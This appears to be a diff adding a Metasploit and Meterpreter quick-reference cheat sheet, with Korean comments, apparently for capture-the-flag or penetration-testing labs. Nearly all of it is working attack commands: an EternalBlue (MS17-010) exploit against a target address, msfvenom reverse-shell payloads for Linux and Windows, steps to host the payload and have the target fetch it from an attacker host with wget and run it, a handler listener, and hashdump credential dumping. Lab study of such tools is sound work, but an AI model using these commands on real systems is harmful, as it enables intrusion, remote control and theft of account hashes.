@@ -150,3 +150,62 @@ show options
 sessions -l
 set session 2
 run
+
+---
+
+# Metasploit & Meterpreter Quick Reference
+
+## 1. EternalBlue (MS17-010) SMB Exploitation
+```bash
+use exploit/windows/smb/ms17_010_eternalblue
+set rhosts 10.10.10.10
+set rport 445
+exploit
+```
+
+## 2. Meterpreter Shell Commands
+```bash
+# 네이티브 대화형 쉘로 전환
+shell
+
+# 파일 탐색 및 플래그 확인
+cd
+dir
+pwd
+search -f flag.txt
+type flag.txt
+
+# 자격 증명 덤프 (Meterpreter 세션)
+hashdump
+```
+
+## 3. MSFVenom 페이로드 생성 및 호스팅
+```bash
+# 리눅스 x86 Reverse Shell ELF
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.201.99.36 LPORT=1234 -f elf > rev_shell.elf
+
+# 윈도우 Reverse Shell EXE
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.201.99.36 LPORT=1234 -f exe > rev_shell.exe
+
+# 공격자 머신에서 HTTP 파일 배포 서버 가동
+python3 -m http.server 1234
+
+# 대상 머신에서 다운로드 및 실행 권한 부여
+wget http://<ATTACKER_IP>:1234/rev_shell.elf
+chmod +x rev_shell.elf
+./rev_shell.elf
+```
+
+## 4. Multi/Handler 리스너 대기
+```bash
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST 10.201.99.36
+set LPORT 1234
+run
+```
+
+## 5. Post-Exploitation 계정 해시 수집
+```bash
+run post/linux/gather/hashdump
+```
